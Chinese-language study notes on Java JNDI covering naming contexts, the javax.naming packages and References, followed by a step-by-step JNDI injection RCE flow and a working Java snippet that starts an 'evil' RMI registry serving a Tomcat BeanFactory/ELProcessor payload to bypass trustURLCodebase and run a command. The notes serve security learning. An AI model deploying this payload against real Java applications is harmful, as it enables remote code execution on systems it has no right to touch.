---
title: "JNDI"
author: ["4shen0ne"]
tags: ["java"]
draft: false
---

> Java 命名和目录接口（Java Naming and Directory Interface，缩写 JNDI），是 Java 的一
> 个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，
> 从而使得开发人员在开发过程中可以使用名称来访问对象。

根据 wiki 的描述，JNDI 全称为 Java Naming and Directory Interface，也就是 Java 命名和
目录接口。既然是接口，那么就必定有其实现，而目前我们 Java 中使用最多的基本就是 rmi
和 [ldap]({{< relref "ldap.md" >}}) 的目录服务系统。而命名的意思就是，在一个目录系统，它实现了把一个服务名称和
对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相
关联的对象或命名引用，然后返回给客户端。而目录的意思就是在命名的基础上，增加了属
性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建
时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而
JNDI 中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一
些关联属性查找到对应的对象。

总结的来说：JNDI 是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名
称等去找到相关的对象，并把它下载到客户端中来。


## Context 上下文 {#context-上下文}

Context 是一组“名称－对象”映射的集合，不同的 context 有自己的命名约定，通常一个
context 对象都会提供 lookup、bind、unbind 和 list 操作用来管理命名列表，并且一个
context 的名称可以映射到另一个具有相同命名约定的 context 对象中（子上下文）

{{< figure src="../.images/Context_上下文/2021-12-06_10-41-49_screenshot.png" >}}


## JNDI 架构 {#jndi-架构}

{{< figure src="../.images/JNDI_架构/2021-12-06_10-44-25_screenshot.png" >}}

JNDI 通过以下 5 个包组成：

1.  javax.naming
2.  javax.naming.directory
3.  javax.naming.ldap
4.  javax.naming.event
5.  javax.naming.spi


## JNDI References {#jndi-references}

在 JNDI 服务中，RMI 服务端除了直接绑定远程对象之外，还可以通过 References 类来绑定一
个外部的远程对象（当前名称目录系统之外的对象）。绑定了 Reference 之后，服务端会先
通过 Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在
lookup()查找这个远程对象时，客户端会获取相应的 object factory，最终通过 factory 类
将 reference 转换为具体的对象实例。

整个利用流程如下：

1.  目标代码中调用了 InitialContext.lookup(URI)，且 URI 为用户可控；
2.  攻击者控制 URI 参数为恶意的 RMI 服务地址，如：rmi://hacker_rmi_server//name；
3.  攻击者 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定某个精心构造的 Factory 类；
4.  目标在进行 lookup()操作时，会动态加载并实例化 Factory 类，接着调用 factory.getObjectInstance()获取外部远程对象实例；
5.  攻击者可以在 Factory 类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到 RCE 的效果；

Tips：JNDI 查找远程对象时 InitialContext.lookup(URL)的参数 URL 可以覆盖一些上下文中
的属性，比如：Context.PROVIDER_URL


### 绕过高版本 jndi 限制 {#绕过高版本-jndi-限制}

trustURLCodebase 限制了应用加载远程 codebase 中的代码，在目标本地使用了 tomcat8+
或者 SpringBoot 1.2.x+ 的前提下可以利用 `org.apache.naming.factory.BeanFactory`

因为是本地 Factory, 不会被 trustURLCodebase 限制。在执行其 getObjectInstance 方
法时让它加载 ELProcessor 类并反射调用其 eval 方法执行命令

```java
System.out.println("Creating evil RMI registry on port 1097");
Registry registry = LocateRegistry.createRegistry(1097);

//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
ref.add(new StringRefAddr("forceString", "x=eval"));
//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")"));

ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
registry.bind("evilEL", referenceWrapper);
```
